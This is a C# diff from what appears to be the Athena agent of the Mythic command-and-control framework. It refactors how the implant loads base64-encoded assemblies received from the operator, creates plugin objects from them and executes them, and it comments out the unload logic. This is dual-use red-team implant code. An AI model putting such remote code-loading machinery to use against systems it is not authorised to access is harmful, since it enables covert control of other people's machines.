@@ -19,7 +19,8 @@ namespace Athena.Commands
     {
         private AssemblyLoadContext commandContext { get; set; }
         private ExecuteAssemblyContext executeAssemblyContext { get; set; }
-        private ConcurrentDictionary<string, Assembly> loadedCommands { get; set; }
+        //private ConcurrentDictionary<string, Assembly> loadedCommands { get; set; }
+        private ConcurrentDictionary<string, IPlugin> loadedPlugins { get; set; }
         public bool assemblyIsRunning { get; set; }
         public string assemblyTaskId { get; set; }
         private StringWriter executeAssemblyWriter { get; set; }
@@ -27,7 +28,7 @@ namespace Athena.Commands
         {
             this.commandContext = new AssemblyLoadContext("athcmd");
             this.executeAssemblyContext = new ExecuteAssemblyContext();
-            this.loadedCommands = new ConcurrentDictionary<string, Assembly>();
+            this.loadedPlugins = new ConcurrentDictionary<string, IPlugin>();
         }
         /// <summary>
         /// Load an assembly into our execution context
@@ -199,7 +200,7 @@ namespace Athena.Commands
         {
             LoadCommand command = JsonConvert.DeserializeObject<LoadCommand>(job.task.parameters);
 
-            if (this.loadedCommands.ContainsKey(command.command))
+            if (this.loadedPlugins.ContainsKey(command.command))
             {
                 return new LoadCommandResponseResult
                 {
@@ -212,7 +213,17 @@ namespace Athena.Commands
 
             try
             {
-                var loadedAssembly = this.loadedCommands.GetOrAdd(command.command, this.commandContext.LoadFromStream(new MemoryStream(await Misc.Base64DecodeToByteArrayAsync(command.asm))));
+                //Load assembly into Context
+                var loadedAssembly = this.commandContext.LoadFromStream(new MemoryStream(await Misc.Base64DecodeToByteArrayAsync(command.asm)));
+
+                //Initialize the plugin
+                //Type t = loadedAssembly.GetType($"Plugin.{job.task.command.Replace("-", String.Empty)}");
+                Type t = loadedAssembly.GetType($"Plugins.Plugin");
+                IPlugin plugin = (IPlugin)Activator.CreateInstance(t);
+                
+                //Add plugin to tracker
+                this.loadedPlugins.GetOrAdd(command.command, plugin);
+
                 return new LoadCommandResponseResult()
                 {
                     completed = "true",
@@ -244,22 +255,22 @@ namespace Athena.Commands
         
         public async Task<object> UnloadCommands(MythicJob job)
         {
-            LoadCommand command = JsonConvert.DeserializeObject<LoadCommand>(job.task.parameters);
+            //LoadCommand command = JsonConvert.DeserializeObject<LoadCommand>(job.task.parameters);
 
             List<CommandsResponse> unloaded = new List<CommandsResponse>();
-            foreach (var cmd in this.loadedCommands.Keys)
-            {
-                if (this.loadedCommands.TryRemove(cmd, out Assembly assembly))
-                {
-                    unloaded.Add(new CommandsResponse()
-                    {
-                        action = "remove",
-                        cmd = cmd
-                    });
-                }
-            }
-            this.commandContext.Unload();
-            this.commandContext = new AssemblyLoadContext("athcmd");
+            //foreach (var cmd in this.loadedCommands.Keys)
+            //{
+            //    if (this.loadedCommands.TryRemove(cmd, out Assembly assembly))
+            //    {
+            //        unloaded.Add(new CommandsResponse()
+            //        {
+            //            action = "remove",
+            //            cmd = cmd
+            //        });
+            //    }
+            //}
+            //this.commandContext.Unload();
+            //this.commandContext = new AssemblyLoadContext("athcmd");
             
             return new LoadCommandResponseResult()
             {
@@ -279,12 +290,10 @@ namespace Athena.Commands
         {
             try
             {
-                Type t = this.loadedCommands[job.task.command].GetType($"Plugin.{job.task.command.Replace("-",String.Empty)}");
-                var methodInfo = t.GetMethod("Execute", new Type[] { typeof(Dictionary<string, object>) });
-                Dictionary<string, object> parameters = JsonConvert.DeserializeObject<Dictionary<string, object>>(job.task.parameters) ?? new Dictionary<string,object>();
+                Dictionary<string, object> parameters = JsonConvert.DeserializeObject<Dictionary<string, object>>(job.task.parameters) ?? new Dictionary<string, object>();
                 parameters.Add("task-id", job.task.id);
+                this.loadedPlugins[job.task.command].Execute(parameters);
 
-                methodInfo.Invoke(null, new object[] { parameters });
                 return null;
             }
             catch (Exception e)
@@ -304,7 +313,7 @@ namespace Athena.Commands
         /// <param name="command">Event Sender</param>
         public async Task<bool> CommandIsLoaded(string command)
         {
-            return this.loadedCommands.ContainsKey(command);
+            return this.loadedPlugins.ContainsKey(command);
         }
     }
 }
